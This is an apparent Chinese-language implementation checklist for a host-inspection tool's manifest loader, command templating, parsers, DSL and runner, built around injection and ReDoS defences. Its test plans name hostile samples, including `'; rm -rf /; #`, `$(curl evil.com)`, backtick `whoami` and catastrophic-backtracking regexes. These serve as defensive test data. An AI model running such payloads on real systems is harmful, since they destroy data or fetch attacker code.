## 1. 依赖与脚手架

- [x] 1.1 `pyproject.toml` 增加 runtime 依赖：`simpleeval>=1.0,<2` + `jinja2>=3.1,<4` + `jsonschema>=4.20,<5`；**全部 PEP 508 语法**（`>=...,<`），与现有风格一致；**禁止** Poetry caret `^`；确认 `pyyaml>=6.0,<7` 已在 M0 落地（如未落地本任务同 PR 加）；验收：`pip install -e ".[dev]"` 成功 + `python -c "import simpleeval, jinja2, jsonschema, yaml"` 不报错
- [x] 1.2 创建 `src/hostlens/inspectors/{schema.py, loader.py, registry.py, runner.py, result.py, dsl.py}` 空骨架文件 + `src/hostlens/inspectors/parsers/{__init__.py, raw.py, table.py, json.py, kv.py}` 空骨架；`hostlens.inspectors.__init__` 仅 re-export 平台无关公共类型（`InspectorManifest` / `InspectorRegistry` / `InspectorRunner` / `InspectorResult` / `InspectorError`），**禁止**在 `__init__.py` 触发 `build_registry_from_search_paths` 等副作用调用；验收：`python -c "import hostlens.inspectors"` 成功；`hostlens.inspectors.__init__` 文件无 side-effect import
- [x] 1.3 创建 `src/hostlens/cli/inspectors.py` Typer 子命令组空骨架；在 `cli/__init__.py` 注册到 app；验收：`hostlens inspectors --help` 列出子命令名（`list` / `show`），每个子命令执行 NotImplementedError 但 `--help` 正确显示

## 2. 异常扩展（InspectorError 结构化字段）

- [x] 2.1 **扩展 `hostlens.core.exceptions.InspectorError`**（覆盖 spec §需求:`InspectorError` 必须扩展支持结构化字段）：从 M0 的 `(message: str, *, original=None)` 扩展为 `(*, kind: str, path: Path | None = None, inspector: str | None = None, parameter: str | None = None, secret: str | None = None, field: str | None = None, index: int | None = None, existing_path: Path | None = None, new_path: Path | None = None, errors: list | None = None, **extra)`；**所有参数都 keyword-only**（用 `def __init__(self, *, kind, ...)` 强制）；`kind` 取值集合用 `Literal` 限定（见 spec §需求:`InspectorError` 必须扩展支持结构化字段 中列出的已知 kind 完整集合——M1 范围共 15 个，含 `manifest_*` 三类 + 命令模板与参数校验五类 + `command_template_invalid` + finding 校验两类 + registry 两类 + parser 一类）；非法 kind raise `ValueError`；positional 调用直接 raise `TypeError`（M0 的 `InspectorError("x")` 调用必须**同 PR**改为 `InspectorError(kind=...)`；M0 测试 `tests/core/test_exceptions.py:21` 的 `InspectorError("x")` 必须替换为 `InspectorError(kind="manifest_parse_error")`）；`__str__` 输出含 `kind:` 前缀 + 非 None 结构化字段的 `key=value` 列表；验收：单测覆盖 (a) 关键字调用 `InspectorError(kind="duplicate_inspector", inspector="x.y", existing_path=Path("a"), new_path=Path("b"))` 全部属性可访问；(b) 非法 kind raise ValueError；(c) **positional 调用 raise TypeError**（与 spec 严格 keyword-only 一致）；(d) `str(err)` 含全部结构化字段
- [x] 2.2 同 PR 更新 `tests/core/test_exceptions.py:21` 把 `InspectorError("x")` 替换为 `InspectorError(kind="manifest_parse_error")`（M0 该测试是当前仓库唯一 positional 调用方；本任务前 grep `InspectorError(` src/ tests/ 确认仅这一处需改）；同 PR grep 仓库 `grep -rn 'InspectorError("' src/ tests/` 必须**零结果**（强制所有 callers 用 `kind=` keyword 形式）

## 3. Schema 与 Pydantic 模型

- [x] 3.1 实现 `hostlens.inspectors.schema.InspectorManifest` Pydantic v2 模型：完整字段集见 spec §需求:`InspectorManifest` Pydantic 模型必须严格 conform M1 字段集；`model_config = ConfigDict(extra="forbid", frozen=True)`；name 用 `Annotated[str, Field(pattern=r"^[a-z][a-z0-9_]*\.[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)*$")]`（强制至少含一个点；`simple_name` 不允许通过）；version 用 `Annotated[str, Field(pattern=r"^\d+\.\d+\.\d+$")]`；targets 用 `Annotated[list[Literal["local", "ssh"]], Field(min_length=1)]`；**requires_files 用 `Annotated[list[Annotated[str, Field(pattern=r"^/[A-Za-z0-9._/-]+$")]], Field(default_factory=list)]` + 额外 `field_validator` 做 component 级二次校验**（拆 `path.split("/")` 后任何 component 等于 `"."` 或 `".."` raise——防穿越；与 spec §场景:requires_files 含 .. 父目录穿越被拒绝 一致）；requires_binaries 用类似 `pattern=r"^[a-zA-Z0-9._-]+$"`；privilege / parse format 等用 Literal 限定值域；验收：单测覆盖 schema 字段集严格性（extra="forbid"）+ name/version 正则违反 raise + targets 为空 raise + requires_files 含 `;` / `$` / 空格 / NUL / `..` 父目录穿越 / `.` 单点 component 各自 raise + M1 禁用字段（hook / sampling_window / artifacts）写入 raise + frozen=True 实例不可变
- [x] 3.2 实现 `hostlens.inspectors.schema.CollectSpec`（command + timeout_seconds）与 `ParseSpec`（format + columns + delimiter + skip_header_rows + raw_extract_regex）嵌套模型；CollectSpec.timeout_seconds 用 `Annotated[int, Field(ge=1, le=300)]`；ParseSpec 用 `model_validator(mode='after')` 强制：
  - `format == "table"` ⇒ `columns` 非空
  - `format == "raw"` 且 `raw_extract_regex` 非 None ⇒ `columns` 非空且长度 == 正则命名组数
  - `format == "raw"` 且 `raw_extract_regex` 为 None ⇒ `columns` 必须为空
  - 非 `table` format ⇒ `skip_header_rows == 1`（默认值）
  - 非 `kv` format ⇒ `delimiter == "="`（默认值）
  - 非 `raw` format ⇒ `raw_extract_regex` 必须为 None
  - `raw_extract_regex` 非 None 时**四层静态闸**（与 spec §需求:CollectSpec... §raw_extract_regex 字段约束一致）：
    1. `len(raw_extract_regex) <= 200`（长度上限）
    2. `re.compile()` 必须成功
    3. 所有捕获组必须是命名组（用 `re.compile(regex).groupindex` 与 `.groups` 比对）
    4. **ReDoS 静态拒绝**：实现 `_detect_redos_pattern(regex_ast) -> str | None` 辅助函数（返回命中的 known-bad pattern 标签或 None），用 `sre_parse.parse(regex)` 拿 AST，walk 所有节点检测以下 6 类（与 spec §需求:CollectSpec... §raw_extract_regex 字段 4 层闸 (4) 一致）：
       - (a) **嵌套量词**：外层 `MAX_REPEAT` / `MIN_REPEAT` 子树含**任何**另一个 `MAX_REPEAT` / `MIN_REPEAT` / `POSSESSIVE_REPEAT`（Python 3.11+）节点（覆盖 `(a+)+` / `(a*)*` / `(?:a+)+`）
       - (b) **量词作用于 ASSERT / ASSERT_NOT**：拒绝 `(?=...)+` / `(?!...)+`（lookahead/lookbehind 加量词）
       - (c) **任何 GROUPREF 节点**（命名或编号 backreference）：拒绝 `(.+)\1+` / `(?P<x>.+)(?P=x)+`
       - (d) **任何 ATOMIC_GROUP 节点**（Python 3.11+ `(?>...)`）
       - (e) **alternation 前缀子集**：扫所有 `BRANCH` 节点抽出每个分支的字面量前缀 `prefix(b)`；若 `∃ b1 != b2: prefix(b1).startswith(prefix(b2)) or prefix(b2).startswith(prefix(b1))` → 拒绝（覆盖 `(a\|aa)+` / `(a\|ab)+`）
       - (f) **量词作用于可匹配空串子模式**：扫 `MAX_REPEAT` / `MIN_REPEAT` 子树，若子树是 `BRANCH` 含空分支、`MAX_REPEAT(min=0)`、或纯 `ASSERT` → 拒绝
     命中任一时**在 `model_validator` 内 raise `ValueError(f"<tag>: <detail>")`**（Pydantic v2 推荐做法；不要直接 raise `ValidationError`，Pydantic 会自动构造最终 `ValidationError`）；测试断言 `ValidationError.errors()[0]["msg"]` 含命中的 tag 字符串
  验收：单测覆盖 ParseSpec 全部 7 条 model_validator 规则 + 正则无法编译 raise + 含匿名组 raise + 长度 ≤200 raise + **9 类 ReDoS payload 各 1 个 fixture raise**。**重要**：每个 ReDoS fixture 必须包成"合法命名组 + 配套 columns"结构，让 ReDoS 检测分支**独立于** column/named-group 数量校验生效（否则 `(a+)+` bare 会先 fail "无命名组" 校验而非命中 ReDoS 分支）：
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(a+)+)", columns: [x] }` —— 嵌套量词
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(a*)*)", columns: [x] }` —— 嵌套量词
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(?:a+)+)", columns: [x] }` —— 非捕获组嵌套量词
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(?=a+)+a)", columns: [x] }` —— lookahead+量词
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(?>a+))", columns: [x] }` —— atomic group (Python 3.11+)
    - `parse: { format: raw, raw_extract_regex: "(?P<x>.+)(?P=x)+", columns: [x] }` —— 命名 backref
    - `parse: { format: raw, raw_extract_regex: "(?P<x>.+)\\1+", columns: [x] }` —— 编号 backref
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(a\|aa)+)", columns: [x] }` —— 前缀子集 alternation
    - `parse: { format: raw, raw_extract_regex: "(?P<x>(a?)*)", columns: [x] }` —— 量词作用空匹配
    每个 fixture 必须断言 raise 的 `pydantic.ValidationError.errors()[0]['msg']` 含命中的 ReDoS 模式标签（如 `"nested_quantifier"` / `"groupref_forbidden"` / `"prefix_subset_alternation"`），证明 ReDoS 分支真的被命中而非被其他校验拦截
- [x] 3.3 实现 `hostlens.inspectors.schema.FindingRule` Pydantic 模型：四字段 `for_each` / `when` / `severity` / `message`；`extra="forbid"`, `frozen=True`；用 `model_validator(mode='after')` 校验：
  - `for_each` 非 None 时必须匹配 `^(.+?)\s+as\s+([a-z_][a-z_0-9]*)$`，且 `<expr>` 部分能被 `simpleeval.SimpleEval().eval(expr)` 编译（catch `simpleeval.NameNotDefined` 是合法的，catch `SyntaxError` 不合法）
  - `when` 表达式必须能被 simpleeval 静态编译（同上）
  - 聚合模式（`for_each is None`）下 `message` 字符串静态扫描：用 `re.findall(r"\{([a-z_][a-z_0-9]*)\.", message)` 拿到引用的 `<var>.<attr>` 模式，如果有任意一个 → raise `InspectorError(kind="finding_message_invalid_aggregate_ref", var=...)`
  验收：单测覆盖 (a) `for_each` 缺 `as` 分隔符 raise；(b) `when` 语法错 raise `finding_when_invalid`；(c) 聚合模式 message 引用 `{p.cpu}` raise；(d) severity 非 3 值之一 raise
- [x] 3.4 实现 `hostlens.inspectors.result.Finding` Pydantic 模型（severity / message / evidence）；evidence 字段类型 `dict[str, str]`（**只接受 str→str**，与 M2 stub `FindingSummary.evidence` 字段类型严格一致；runner 在投影 finding 时把 simpleeval 求值过的复杂类型 stringify）；`extra="forbid", frozen=True`；验收：单测覆盖字段集严格性 + frozen 不可变
- [x] 3.5 实现 `hostlens.inspectors.result.InspectorResult` Pydantic 模型（name/version/status/target_name/duration_seconds/output/findings/error/missing）；status 用 `Literal["ok", "timeout", "target_unreachable", "requires_unmet", "exception"]`；`model_validator(mode='after')` 强制：
  - `status == "ok"` ⇒ `error is None` 且 `missing == []`
  - `status == "requires_unmet"` ⇒ `missing` 非空
  - `status in ("timeout", "target_unreachable", "exception")` ⇒ `missing == []`
  `extra="forbid", frozen=True`；验收：单测覆盖 4 条 model_validator 规则

## 4. Loader 与静态校验

- [x] 4.1 实现 `hostlens.inspectors.loader.load_manifest(path: Path) -> InspectorManifest` 核心流程：
  - `path.stat().st_size > 262144` raise `InspectorError(kind="manifest_too_large", path=path, size=size)`
  - `yaml.safe_load(path.read_text())`（**禁止** `yaml.load(...)` —— grep CI 必须确认零结果）
  - **任何 `yaml.YAMLError` 子类**（含 `ConstructorError` / `ScannerError` / `ParserError` / `ComposerError`）统一 `try/except yaml.YAMLError as e: raise InspectorError(kind="manifest_parse_error", path=path, line=line, column=col, original=e)`；line/column 从 `e.problem_mark`（若为 MarkedYAMLError 子类）；**禁止**让任何 yaml 子类异常 propagate
  - `InspectorManifest.model_validate(data)`；`pydantic.ValidationError` 包成 `InspectorError(kind="manifest_validation_error", path=path, errors=err.errors())`
  - 调用 `_validate_command_template(...)` 时 catch `jinja2.TemplateSyntaxError as e: raise InspectorError(kind="command_template_invalid", path=path, line=e.lineno, message=e.message)`；其他 Jinja2 异常透传到 loader 外层 catch 不变
  验收：单测覆盖 (a) 文件超过 256KB raise；(b) yaml 含 `!!python/object/apply` raise `InspectorError(kind="manifest_parse_error", original=<ConstructorError>)`（**不**让 ConstructorError 直接 propagate）；(c) yaml 语法错 raise 含 line+column；(d) Pydantic 校验错 raise 含 errors 字段；(e) `collect.command: "{{ unclosed"` 触发 `jinja2.TemplateSyntaxError` raise `InspectorError(kind="command_template_invalid", line=1)`
- [x] 4.2 实现 `hostlens.inspectors.loader._validate_parameters_schema(parameters: dict | None) -> None`：对 `parameters.properties` 中每个字段递归扫，对所有"会被实际值填充的 string 类型字段"（与 spec §需求:Manifest loader 必须 reject string parameter 缺少 pattern/enum 一致）校验：
  - 顶层 `type == "string"` 字段必须含 `pattern` 或 `enum`，否则 raise `InspectorError(kind="parameter_missing_charset_constraint", parameter=name)`
  - `type == "array"` 且 `items.type == "string"` 时，**items schema 必须含 `pattern` 或 `enum`**（数组元素也进 shell 命令）；缺失 raise `parameter_missing_charset_constraint`，extra 中 `parameter` 字段值为 `<name>.items`
  - `type == "object"` 时递归扫 `properties`
  验收：单测覆盖 (a) 顶层 string 无约束 raise；(b) nested object 内 string 无约束 raise；(c) integer 字段无 minimum raise 不触发；(d) string 含 pattern OK；(e) string 含 enum OK；(f) **array(string-items) items 无 pattern/enum raise**；(g) array(non-string items) 无 items pattern OK
- [x] 4.3 实现 `hostlens.inspectors.loader._validate_command_template(command: str, parameters: dict | None, secrets: list[str]) -> None`：
  - 用 `jinja2.Environment().parse(command)` 拿 AST
  - **必须用 `jinja2.visitor.NodeVisitor` 完整遍历所有节点**（**禁止**只走 `nodes.Name`），遍历 `nodes.Output` / `nodes.Filter` / `nodes.Name` / `nodes.Getitem` / `nodes.Call` / `nodes.CondExpr`（三元）/ `nodes.Concat`（字符串拼接）/ `nodes.If` block 内引用 / macro 调用——任何位置出现的 `nodes.Name` 都必须按下方规则校验
  - 对每个 `nodes.Name` 节点 lookup `parameters` schema 拿到其类型：
    - **secrets 列表中**：raise `InspectorError(kind="secret_inlined_in_command", secret=name)`
    - **string 类型** 且 filter chain 不含 `sh` → raise `InspectorError(kind="unquoted_parameter_in_command", parameter=name)`
    - **array 类型**分情况：
      - `items.type == "string"`：filter chain 必须是 `[map('sh'), join(...)]` 序列（map 在 join 之前）→ 否则 raise `InspectorError(kind="unquoted_array_parameter_in_command", parameter=name)`
      - `items.type` 是 `integer` / `number` / `boolean`：无 filter 要求
      - **`items` 缺失 / `items.type` 缺失 / `items.type` 是 `object` 或 `array` / `items` 用 `oneOf/anyOf/allOf` 而无单一 `type`** → raise `InspectorError(kind="array_parameter_items_type_undetermined", parameter=name)`（堵住"省略 items 绕过 sh-filter"路径）
    - 例外：若 Name 后紧跟 `nodes.Getitem`（subscript `endpoints[0]`），把整个 subscript 表达式视作 string 类型，按 string 规则校验（必须 `| sh`）
    - 非 string / 非 array 类型：无 filter 要求
  - 扫 `nodes.Getitem` 节点：subscript 形式（如 `env['PGPASSWORD']`）如果 const 部分匹配 secrets 名 → 同 `secret_inlined_in_command` raise
  - manifest 顶层 `unsafe_raw: true` → raise `InspectorError(kind="unsafe_raw_not_supported_in_m1")`
  验收：单测覆盖 ≥18 种边角写法：(a) `{{ host }}` 无 sh raise；(b) `{{ host | sh }}` OK；(c) `{{ host | default('') }}` 无 sh raise（filter chain 必须穿透）；(d) `{{ port }}`（integer）OK 无需 sh；(e) `{{ PGPASSWORD }}` raise secret_inlined；(f) `{{ env['PGPASSWORD'] }}` raise；(g) `{%- if x -%}{{ host }}{%- endif -%}`（block 内引用）无 sh raise；(h) `{{ endpoints | map('sh') | join(' ') }}` OK（数组类型）；(i) `{{ endpoints | join(' ') }}` 无 map('sh') raise `unquoted_array_parameter_in_command`；(j) `{{ endpoints | join(' ') | map('sh') }}` filter 顺序错 raise；(k) `{{ endpoints[0] | sh }}` OK（subscript 后单元素 string）；(l) `{{ ports | join(',') }}`（integer array）OK 无需 map('sh')；(m) `unsafe_raw: true` 顶层 raise；(n) `$PGPASSWORD` 字面量（**非** Jinja2 插值）OK；(o) `{{ host if host else 'localhost' }}`（CondExpr 三元）无 sh raise（AST 必须穿透 CondExpr）；(p) **array 缺 items 声明 raise `array_parameter_items_type_undetermined`**（如 `parameters.endpoints: { type: array }` 无 items）；(q) **array items.type 是 object raise `array_parameter_items_type_undetermined`**；(r) **array items 用 oneOf raise `array_parameter_items_type_undetermined`**
- [x] 4.4 实现 `hostlens.inspectors.loader._validate_findings(findings: list[FindingRule]) -> None`：遍历每个 finding rule，跑 task 3.3 model_validator 之外的额外校验（在 Manifest 级别拿到 index 信息）；任何错误 raise `InspectorError(kind="finding_*_*", index=i, ...)`；验收：单测覆盖聚合模式 message 含 `{p.x}` raise + index 字段正确
- [x] 4.5 集成 `load_manifest` 调用顺序：解析 yaml → Pydantic 校验 manifest → `_validate_parameters_schema(manifest.parameters)` → `_validate_command_template(manifest.collect.command, manifest.parameters, manifest.secrets)` → `_validate_findings(manifest.findings)`；任一步骤 raise 直接 propagate；验收：端到端测试：含 unquoted_parameter 的 manifest 必须先过 Pydantic 校验再被 _validate_command_template raise
- [x] 4.6 **shell 注入 payload 矩阵**：`tests/inspectors/test_loader_injection.py` 覆盖 ≥10 个真实注入 payload：`'; rm -rf /; #` / `$(curl evil.com)` / `\`whoami\`` / `\x00` / `\n; payload` / Unicode RTL override `‮` / `${PATH:0:1}` shell expansion / 单引号嵌入 / 双引号嵌入 / heredoc EOF 序列；测试构造 parameter 含 `pattern: "^[a-zA-Z0-9.-]+$"` 限制 + command 走 `{{ x | sh }}`；断言渲染后的 cmd string **逐字符**不含原始 payload 的 dangerous chars（由 `shlex.quote` 转义）；验收：每个 payload 单独一个 test case + assertion error message 含原始 payload 与 quoted 结果对比

## 5. Parsers（4 种 format）

- [x] 5.1 实现 `hostlens.inspectors.parsers.raw.parse_raw(stdout, spec) -> dict[str, Any]`：
  - `spec.raw_extract_regex is None` ⇒ 返回 `{"raw": stdout}`
  - 非 None ⇒ `re.compile(regex).search(stdout)`（**只匹配一次**）
  - 匹配成功 ⇒ `{col: match.group(col) for col in spec.columns}`
  - 匹配失败 ⇒ `{col: None for col in spec.columns}`
  - **ReDoS 防御不在此**：主防御已在 ParseSpec model_validator 静态拒绝嵌套量词等模式（task 3.2）；runner 包 `asyncio.wait_for(asyncio.to_thread(parse_raw), timeout=1.0)` 仅作为软兜底日志事件（**不**保证能中断 C-level 回溯，写入 design.md 风险/权衡）
  验收：单测覆盖 4 种情形（无 regex / 匹配成功 / 匹配失败 / 多命名组顺序映射）；**禁止**单测在此层加 ReDoS timeout 断言（防御在 ParseSpec 层，已由 task 3.2 验收覆盖）
- [x] 5.2 实现 `hostlens.inspectors.parsers.table.parse_table(stdout, spec) -> dict[str, Any]`：
  - `lines = stdout.splitlines()[spec.skip_header_rows:]`
  - 每行 `re.split(r"\s+", line.strip(), maxsplit=len(spec.columns)-1)`
  - 列数不足 → 该行 skip + warning log（结构化字段含 line_no / actual_cols / expected_cols）
  - 列数过多 → maxsplit 已处理（多余部分合并到最后一列）
  - 返回 `{"rows": [{col: val, ...}, ...]}`
  验收：单测覆盖 (a) 3 行 3 列正常；(b) skip_header_rows=0 / 2；(c) 列数不足行 skip + 计数；(d) 列数过多合并；(e) 空 stdout 返回 `{"rows": []}`
- [x] 5.3 实现 `hostlens.inspectors.parsers.json.parse_json(stdout, spec) -> dict[str, Any]`：
  - `data = json.loads(stdout)`（`JSONDecodeError` propagate 让 runner 捕获）
  - 顶层 `not isinstance(data, dict)` ⇒ raise `InspectorError(kind="parse_json_not_object")`
  - 返回 data
  验收：单测覆盖正常 dict / list raise / scalar raise / 无效 JSON propagate
- [x] 5.4 实现 `hostlens.inspectors.parsers.kv.parse_kv(stdout, spec) -> dict[str, str]`：
  - 每行 `line.split(spec.delimiter, maxsplit=1)`
  - 长度 < 2 skip + warning log
  - key/value strip
  - 同 key 重复 → 后者覆盖前者 + warning log
  验收：单测覆盖默认 `=` delimiter / 自定义 `:` delimiter / 长度不足行 skip / 重复 key 覆盖

## 6. Finding DSL 引擎

- [x] 6.1 实现 `hostlens.inspectors.dsl.evaluate(expr, context, *, timeout_seconds=1.0) -> Any`：
  - 构造 `simpleeval.SimpleEval()` 实例
  - `functions = {"len": len, "sum": sum, "min": min, "max": max, "any": any, "all": all, "now": _utc_now, "float": float, "int": int}`（**float / int 必须注册**，否则 system.uptime 的 finding rule 无法跑）
  - `names = context`
  - 求值用 `await asyncio.wait_for(asyncio.to_thread(evaluator.eval, expr), timeout=timeout_seconds)`；超时 raise `asyncio.TimeoutError`
  - `_utc_now()` 返回 `datetime.now(timezone.utc)`
  - 在求值前用 `_validate_ast(expr)` 静态扫禁用节点（`ast.parse(expr)` + `ast.walk` 检查）：禁止 `Lambda` / `ListComp` / `SetComp` / `DictComp` / `GeneratorExp` / `Import` / `ImportFrom` / `Subscript` 中的非 slice 用法 / 任何 `__dunder__` attribute；命中 raise `simpleeval.FeatureNotAvailable`
  验收：单测覆盖 spec 中 9 个场景（简单算术 / attribute access / lambda 拒 / list comp 拒 / dunder 拒 / 经典逃逸拒 / timeout / now 返回 tz-aware UTC / float 注册）；额外覆盖 `__class__.__bases__` 等 5 个已知 sandbox 逃逸 payload 全部被拒
- [x] 6.2 实现 `hostlens.inspectors.dsl.parse_for_each(for_each: str) -> tuple[str, str]`：用 regex `^(.+?)\s+as\s+([a-z_][a-z_0-9]*)$` 解析，返回 `(iterable_expr, var_name)`；语法错 raise `InspectorError(kind="finding_when_invalid")`；验收：单测覆盖正常 / 缺 as / var 含非法字符
- [x] 6.3 实现 `hostlens.inspectors.dsl.format_message(template: str, context: dict[str, Any]) -> str`：用 Python `str.format(**context)`；`KeyError` → propagate 让 runner 捕获并 skip 当前 finding；验收：单测覆盖 (a) `"hello {name}"` 正常；(b) `"hello {a.b}"` attribute access；(c) 引用未绑定变量 raise KeyError

## 7. InspectorRegistry + build_registry_from_search_paths

- [x] 7.1 实现 `hostlens.inspectors.registry.InspectorRegistry`（API：`register(manifest)` / `get(name)` / `names()` / `list()` / `list_summaries()`；name 冲突 raise）；内部用 `dict[str, tuple[InspectorManifest, Path | None]]`（path 用于错误信息）；`register` 必须接受可选 `source_path: Path | None = None` 参数；duplicate raise 时 extra 含 existing_path 与 new_path；验收：单测覆盖注册 / 查询 / names 字典序 / list 字典序 / list_summaries 投影完整 + tags 与 targets 字典序 / get 未找到 raise / 同名重复 raise
- [x] 7.2 实现 `hostlens.inspectors.registry.RegistryBuildResult` dataclass（含 `registry: InspectorRegistry` + `errors: list[RegistryLoadError]`）+ `RegistryLoadError` dataclass（含 `path / kind / detail`）+ `build_registry_from_search_paths(user_paths: list[Path], *, settings: Settings) -> RegistryBuildResult`：
  - builtin 路径 hardcode：`Path(hostlens.inspectors.__file__).parent / "builtin"`
  - 先 `Path.rglob("*.yaml")` 扫 builtin，按字典序加载并 register；**builtin 文件级错误必须 raise**（不 collect；理由：仓库自带 bug 必须立即暴露）
  - 再遍历 user_paths（按传入顺序，每个 path 内字典序 rglob）；用户路径下的**文件级错误**（manifest_parse_error / manifest_validation_error / shell 注入校验失败等）catch 并累积到 `errors` 列表，**不**阻塞其他 manifest 加载
  - 任何 `duplicate_inspector` 错误（builtin vs builtin / 用户 vs builtin / 用户 vs 用户）**仍** raise——这是 SECURITY 关键，silent collect 会让攻击者放同名 manifest 后无感知
  - **禁止**任何"用户路径覆盖 builtin"的开关
  验收：单测覆盖 (a) builtin 默认加载 hello.echo + system.uptime，`result.errors == []`；(b) 用户路径同名 builtin raise `duplicate_inspector`（**fatal**，不进 errors）；(c) 用户路径间冲突 raise duplicate（**fatal**）；(d) **用户路径含 1 个语法错 yaml + 2 个正常 manifest 时，`result.registry` 含 2 个正常 + builtin，`result.errors` 含 1 项 `RegistryLoadError(path=<bad>, kind="manifest_parse_error")`，**不**抛**；(e) **builtin 路径含语法错 yaml 时 raise**（与用户路径 collect 行为对比）；(f) **grep `src/hostlens/inspectors/registry.py` 必须不含 `allow_builtin_override` / `settings.builtin_inspectors_path` 等绕过路径**

## 8. InspectorRunner

- [x] 8.1 实现 `hostlens.inspectors.runner.InspectorRunner.__init__(self, target_registry, *, settings, logger)`：依赖注入；不调用 subprocess / 不解析 yaml；纯构造；验收：单测断言 `__init__` 不触发 IO
- [x] 8.2 实现 `InspectorRunner._preflight(manifest, target, *, allow_privileged) -> tuple[Literal["ok"] | Literal["requires_unmet"], list[str]]`：按 spec §需求:`InspectorRunner` 求值顺序必须固定 的 6 步 preflight；遇到第一个不满足条件 → 返回 `("requires_unmet", missing=[...])`；全部通过 → `("ok", [])`；6 步顺序：(1) target type 兼容 → (2) capabilities → (3) privilege → (4) env secrets → (5) binaries → (6) files；step (5)：`target.exec(f"command -v {shlex.quote(bin)}", timeout=10)` 探测；step (6)：`target.exec(f"[ -r {shlex.quote(path)} ]", timeout=5)` 探测——**必须用 `shlex.quote` 包路径/binary 名**作为防御纵深（field-level regex 已是第一道闸；shlex.quote 是第二道闸）；多 binary/file 并发用 `asyncio.gather`；验收：单测覆盖 (a) 6 种 requires_unmet 触发条件 + 顺序（如同时缺 capability 和 binary，必须先报 capability 而非 binary，因为 step (2) 在 step (5) 之前）；(b) **shlex.quote 防御验证**：mock target.exec 计数调用参数；用 `requires_files=["/tmp/a"]` 构造合法 manifest（字段层正则通过），断言 target.exec 收到的 cmd string 严格等于 `[ -r '/tmp/a' ]`（含单引号）；(c) 写一个伪造 manifest（绕过 Pydantic 的方式：构造 `InspectorManifest.model_construct(requires_files=["/tmp/x; rm -rf /"])` 直接跳过校验）跑 preflight，断言 target.exec 收到的 cmd 是 `[ -r '/tmp/x; rm -rf /' ]`（shlex.quote 转义后**不**变成可执行的注入）
- [x] 8.3 实现 `InspectorRunner._render_command(manifest, parameters) -> tuple[str, dict[str, str]]`：
  - 用 `jinja2.Environment(autoescape=False)` + 注册 `sh` filter (`shlex.quote(str(v))`)
  - 注册 `map` filter（默认）& 自定义 `sh` filter
  - 渲染 `manifest.collect.command`；`jinja2.UndefinedError` propagate（runner 转 `status="exception"`）
  - 同时返回 `secrets_env: dict[str, str]` 从 `os.environ` 拿 manifest.secrets 中声明的所有 var（preflight 已确认存在）
  验收：单测覆盖 (a) parameters 渲染 + sh quote 转义注入字符；(b) secrets_env 完整；(c) jinja2.UndefinedError propagate；(d) `sh` filter 接 None / 空 list raise
- [x] 8.4 实现 `InspectorRunner._parse_and_validate(stdout, parse_spec, output_schema) -> dict[str, Any]`：
  - 根据 `parse_spec.format` 调对应 parser（task 5.x 实现）
  - 解析失败 raise（runner 转 `status="exception"`）
  - 用 `jsonschema.validate(parsed, output_schema)` 校验；`ValidationError` propagate（runner 转 `exception`）
  - 返回 parsed dict
  验收：单测覆盖 4 种 format dispatch + schema validation 失败 propagate
- [x] 8.5 实现 `InspectorRunner._evaluate_findings(findings: list[FindingRule], output: dict, parameters: dict) -> list[Finding]`：
  - 遍历每个 finding rule
  - 构造求值 context = `{**output, **(parameters or {})}`（output 顶层字段优先）
  - 遍历模式：`iterable = await evaluate(<expr>, context)`；对每个 item 构造 `iter_context = {**context, var_name: item}`；求 `when` 表达式 → True 时 `format_message(message, iter_context)` 加 finding（evidence = `{var_name: str(item)}`）
  - 聚合模式：求 `when(context)` → True 时 `format_message(message, context)` 加 finding（evidence = `{}`）
  - 单个 rule 求值异常（simpleeval / format KeyError / asyncio.TimeoutError）→ skip + warning log；其他 rule 继续
  - 返回 findings 列表（按 rules 顺序）
  验收：单测覆盖 (a) 遍历模式产生 N 个 finding；(b) 聚合模式产生 0 或 1 finding；(c) 单 rule 异常 skip 不影响其他；(d) `when` 求值非 bool 也 skip + warning
- [x] 8.6 实现 `InspectorRunner.run(manifest, target, parameters=None, *, allow_privileged=False, cancel=None) -> InspectorResult`：
  - 验参：`manifest is None` / `target is None` raise `ValueError`
  - 起 `start_time = time.monotonic()`
  - **每个业务调用点用精确 except 列表**（与 spec §需求:`InspectorRunner.run` 必须永远返回... §契约表格一致）：
    - `target.exec(...)` 调用：`try ... except TargetError as e: return InspectorResult(status="target_unreachable", error=e.kind, ...)`
    - Jinja2 `template.render(...)` 调用：`try ... except (jinja2.UndefinedError, jinja2.TemplateError) as e: return InspectorResult(status="exception", error=f"render_failed: {e}", ...)`
    - parser 调用：`try ... except (json.JSONDecodeError, InspectorError) as e: return InspectorResult(status="exception", error=f"parse_failed: {e}", ...)`（**注意**：catch `InspectorError` 仅在此调用点窄域 try 内，不要全局 catch）
    - `jsonschema.validate(...)` 调用：`try ... except jsonschema.ValidationError as e: return InspectorResult(status="exception", error=f"output_schema_mismatch: {e.message}", ...)`
    - DSL evaluate 调用（在 `_evaluate_findings` 内部）：`try ... except (simpleeval.InvalidExpression, simpleeval.FeatureNotAvailable, simpleeval.NameNotDefined, simpleeval.NumberTooHigh, simpleeval.WrongType, simpleeval.IterableTooLong, asyncio.TimeoutError) as e: <skip rule + warning log>`（**必须**覆盖 simpleeval 1.0+ 的全部 6 类业务异常 + asyncio TimeoutError）
    - `format_message` 调用（在 `_evaluate_findings` 内部）：`try ... except (KeyError, IndexError, AttributeError) as e: <skip rule + warning log>`
    - **唯一允许 catch KeyError/AttributeError 的地方就是 `format_message` 调用点**；其他位置出现的 KeyError/AttributeError/TypeError 必须 propagate
  - **禁止**在 `run()` 顶层写 bare `except Exception` 或 `except (AttributeError, KeyError, TypeError)`；任何不在上述列表的异常 propagate
  - preflight returns `requires_unmet` → 直接返回 InspectorResult（status="requires_unmet"），**不**走 render / exec
  - `target.exec` 返回 `ExecResult(timed_out=True)` → 通过返回值判断（**不**是异常），status → `timeout`
  - 成功路径返回 `InspectorResult(status="ok", duration_seconds=time.monotonic()-start_time, ...)`
